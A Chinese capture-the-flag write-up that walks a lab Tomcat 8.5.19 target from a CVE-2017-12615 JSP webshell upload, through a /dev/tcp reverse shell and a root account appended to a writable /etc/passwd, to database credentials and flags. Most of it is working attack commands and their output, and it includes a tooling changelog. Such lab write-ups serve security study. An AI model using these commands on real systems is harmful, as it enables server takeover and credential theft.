# 真题实战：④ 回声 · 遗忘的部署（300 pts）—— 全链路记录

> 靶机：`http://10.8.0.6:8085` · 档案云 Box（Apache Tomcat/8.5.19 · Debian 9 · 容器）
> 攻击机：`10.8.0.12`（OpenVPN） · 面板：PivotHub `http://127.0.0.1:8033/?project=proj-10h9m`
> 项目：`proj-10h9m`（④ 回声 · 遗忘的部署）；演示项目 `proj-1` 未被污染。

## 0. 战果（3/3）

| # | Flag | 位置 | 获取方式 |
|---|---|---|---|
| 1 | `flag{t4-REDACTED}` | `/flag1.txt`（tomcat9 644） | CVE-2017-12615 PUT 写马后读取 |
| 2 | `flag{t4-REDACTED}` | `/flag3.txt`（root 600） | `/etc/passwd` 666 → 追加 UID=0 账户 → `su` 提权 |
| 3 | `flag{t4-REDACTED}` | `archive.secret_vault`（db01:3306） | `WEB-INF/db.properties` 弱口令 → mysql 查询 |

## 1. 攻击链与真实证据

### 1.1 侦察（经面板会话层执行）

```
GET /            → 200 · JSESSIONID · 标题「档案云 Box - 文件归档平台」
OPTIONS /        → 405 · "JSPs only permit GET POST or HEAD" · Apache Tomcat/8.5.19
路径枚举          → /list.jsp /about.jsp /index.jsp 200；/manager /upload 404
```

### 1.2 CVE-2017-12615（PUT 写 JSP 马）

```
PUT /pivothub_probe.txt/   → 204   （尾斜杠形态）
GET /pivothub_probe.txt    → 200 pivothub-put-probe   ← 任意文件写入确认
PUT /pivot_shell.jsp/      → 201
POST /pivot_shell.jsp cmd=id → uid=1000(tomcat9) gid=1000(tomcat9)
```

马协议与 PivotHub JSP 驱动一致（`Runtime.exec("/bin/sh","-c",cmd)`），登记即真实探活：
`alive=true · latency=144ms · hostname=archive-web`。

### 1.3 /dev/tcp 反弹（题目要求的稳定会话）

```
攻击机（面板）：POST /api/shells/reverse/listen  {bind:10.8.0.12, port:<p>}
靶机（JSP 马）：bash -c 'bash -i >& /dev/tcp/10.8.0.12/<p> 0>&1'
面板：POST /api/shells/reverse/register → 会话 kind=reverse（真实回显）
```

**坑点**：JSP 马的 `/bin/sh` 是 dash（`/bin/sh -> dash`），`>&` 是 bash 语法，
直接写 `bash -i >& /dev/tcp/...` 会报 `Syntax error: Bad fd number`；
必须 `bash -c '...'` 包一层。bash 本体存在（`/usr/bin/bash` 4.4.12）。

### 1.4 文件权限类提权

```
ls -la /etc/passwd   → -rw-rw-rw- （666！entrypoint.sh 第 4 条：外包代维加固脚本误设，2025-11 未回滚）
openssl passwd -1 -salt pivothub 'REDACTED****' → $1$pivothub$REDACTED
echo 'pivot:$1$pivothub$...:0:0:root:/root:/bin/bash' >> /etc/passwd
script -qec 'su - pivot' /dev/null        ← 造 PTY（su 必须 TTY）
（面板 /api/shells/{id}/io 喂密码）
id → uid=0(root) gid=0(root)
```

### 1.5 内网库

```
cat WEB-INF/db.properties → db.host=db01 db.user=archive db.pass=REDACTED****
getent hosts db01         → 172.33.0.20
mysql -h db01 -u archive -p'REDACTED****' -D archive -e 'show tables'
  → files / secret_vault
select * from secret_vault → flag{t4-REDACTED}
```

## 2. 本轮为打通该链路新增的 PivotHub 能力

| 能力 | 位置 | 说明 |
|---|---|---|
| 反弹 Shell 监听/通道 | `pivothub/session/reverse.py`（会话层） | `ReverseShellListener` + `ReverseShellChannel`（哨兵同步 exec、`send_raw`/`read_until` 交互），`/dev/tcp` 反弹纳入统一会话抽象层 |
| 监听/登记/交互接口 | `pivothub/api/shells.py` | `POST /api/shells/reverse/listen`、`GET /api/shells/reverse/listeners`、`POST /api/shells/reverse/register`、`POST /api/shells/{id}/io` |
| Shell 驱动类型 | `models/shell.py` `kind` + `schemas/shell.py` | `''`=HTTP 马 / `'reverse'`=反弹通道；DB 自动迁移补列 |
| URL 指定项目 | `assets/js/store.js` | `?project=<id>` 直接打开指定项目（多项目并行时省去手点下拉框） |

## 3. 复跑命令

```powershell
# 面板（独立库，避免与演示项目混）
$env:PIVOTHUB_PORT="8033"; $env:PIVOTHUB_DB_PATH="_work\ctf.db"
python -m pivothub --no-open
# 浏览器
start http://127.0.0.1:8033/?project=proj-10h9m
# 各步骤脚本
python _work\ctf_step1_recon.py            # 侦察
python _work\ctf_step3_shell.py            # PUT 写马 + 验证
python _work\ctf_new_project.py            # 新建项目 + 登记边界机/会话 + flag1
python _work\ctf_reverse_su.py             # /dev/tcp 反弹 + su 提权
python _work\ctf_mysql_query.py            # 内网库查询
python _work\ctf_vault.py                  # secret_vault → 第 3 个 flag
python _work\ctf_finalize.py               # 三 flag 入库 + 时间线复盘
```

## 4. 已知边界

- 反弹通道是**进程内对象**：面板重启后通道失效，需让靶机重新回连（HTTP 马会话不受影响）。
- 提权依赖 `/etc/passwd` 666 这一**靶场配置缺陷**（entrypoint 明确声明），不是通用 0day。
- `db.jsp`（靶机自带的读库页面）在本机经 `127.0.0.1:8085` 访问返回空，改用边界机自带 `mysql` 客户端直连成功；
  两条路径凭据相同，结论一致。
